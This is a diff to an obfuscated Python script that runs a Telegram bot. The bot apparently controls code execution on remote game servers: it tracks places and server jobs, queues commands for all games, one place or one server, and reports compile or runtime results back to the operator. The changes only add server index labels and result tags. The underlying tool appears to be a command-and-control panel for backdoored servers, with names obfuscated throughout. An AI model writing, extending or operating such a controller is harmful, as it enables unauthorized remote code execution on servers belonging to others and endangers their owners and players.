@@ -58,7 +58,14 @@ def _h2():
             _a5[_pid_i] = {"name": _nm, "jobs": {}}
         else:
             _a5[_pid_i]["name"] = _nm
-        _a5[_pid_i]["jobs"][_jid] = {"t": time.time(), "players": _pl_i, "max": _mx_i, "mode": _md}
+        _prev = _a5[_pid_i]["jobs"].get(_jid, {})
+        _a5[_pid_i]["jobs"][_jid] = {
+            "t": time.time(),
+            "players": _pl_i,
+            "max": _mx_i,
+            "mode": _md,
+            "idx": _prev.get("idx")
+        }
         _out = []
         _rest = []
         for _c in _a2:
@@ -144,12 +151,12 @@ def _menu_game(_p):
         _nm = _info.get("name", "Unknown")
         _js = _info.get("jobs", {})
         _total = sum(j["players"] for j in _js.values())
-        _max_total = sum(j.get("max", 0) for j in _js.values())
         _btns = []
-        _btns.append([{"text": f"All Servers ({_total}/{_max_total})", "callback_data": f"use:{_p}:all"}])
+        _btns.append([{"text": f"All Servers ({_total} Players)", "callback_data": f"use:{_p}:all"}])
         _n = 0
         for _j, _ji in _js.items():
             _n += 1
+            _ji["idx"] = _n
             _pl = _ji.get("players", 0)
             _mx = _ji.get("max", 0)
             _btns.append([{
@@ -204,7 +211,12 @@ def _p1():
                                 _b1["target"] = "job"
                                 _b1["place"] = _p
                                 _b1["job"] = _j
-                                _edit(_mid, f"Target: Server {_j[:20]}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
+                                try: _p_i = int(_p)
+                                except: _p_i = _p
+                                _ji = _a5.get(_p_i, {}).get("jobs", {}).get(_j, {})
+                                _idx = _ji.get("idx")
+                                _label = f"Server {_idx}" if _idx else "Server"
+                                _edit(_mid, f"Target: {_label}", {"inline_keyboard": [[{"text": "Back", "callback_data": f"menu:game:{_p}"}]]})
                     try:
                         requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                       data={"callback_query_id": _cb["id"]})
@@ -255,7 +267,7 @@ def _p1():
                 elif _t == "job":
                     with _a4:
                         _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
-                    _s1(f"Sent: Server {_b1['job'][:20]}")
+                    _s1(f"Sent: Server")
         except Exception as _e:
             print("Err:", _e)
             time.sleep(3)
@@ -268,6 +280,7 @@ def _p2():
                 continue
             _b = _a3[:]
             _a3.clear()
+            _tgt = _b1["target"]
         for _x in _b:
             _c = _x.get("cmd") or ""
             _o = (_x.get("out") or "").strip()
@@ -278,13 +291,23 @@ def _p2():
                 _nm = _info.get("name", str(_pl))
                 _ji = _info.get("jobs", {}).get(_j, {})
                 _mode = _ji.get("mode", "Server")
+                _idx = _ji.get("idx")
+            if _tgt == "all":
+                _tag = "[All Games]"
+            elif _tgt == "place":
+                _tag = f"[{_nm}/All Servers/{_mode}]"
+            else:
+                if _idx:
+                    _tag = f"[{_nm}/Server {_idx}/{_mode}]"
+                else:
+                    _tag = f"[{_nm}/Server/{_mode}]"
             if _o.startswith("compile err:") or _o.startswith("runtime err:"):
-                _s1(f"[{_nm}/Server/{_mode}] Error\n{_o}")
+                _s1(f"{_tag} Error\n{_o}")
             else:
                 if not _o or _o == "nil":
-                    _s1(f"[{_nm}/Server/{_mode}] Done")
+                    _s1(f"{_tag} Done")
                 else:
-                    _s2("result.txt", f"[{_nm}/Server/{_mode}] $ {_c}\n\n{_o}")
+                    _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")
 
 threading.Thread(target=_p1, daemon=True).start()
 threading.Thread(target=_p2, daemon=True).start()
